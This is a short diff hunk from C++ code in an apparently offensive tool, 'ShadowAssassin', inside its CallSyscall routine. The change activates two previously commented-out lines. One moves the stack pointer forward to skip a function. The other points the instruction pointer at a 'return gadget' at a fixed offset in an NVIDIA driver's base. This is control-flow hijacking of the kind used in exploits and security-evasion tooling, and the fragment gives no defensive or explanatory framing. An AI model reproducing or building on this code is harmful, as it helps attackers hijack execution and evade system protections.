@@ -168,11 +168,12 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 
     UINT64 old_rsp = frameManager.ReadRegister("rsp"); // testing to shift the stack
 
-    printf("[Callsys] Old RSP: %llx", old_rsp);
+    printf("[Callsys] Old RSP: %llx\n", old_rsp);
 
-    //frameManager.WriteRegister("rsp", old_rsp + 0x58); //shifting stack forward so we can skip function
 
-    //frameManager.WriteRegister("rip", nvidia_base + 0x60ea0d); // return gadget
+    frameManager.WriteRegister("rsp", old_rsp + 0x58); //shifting stack forward so we can skip function
+
+    frameManager.WriteRegister("rip", nvidia_base + 0x60ea0d); // return gadget
 
 
 
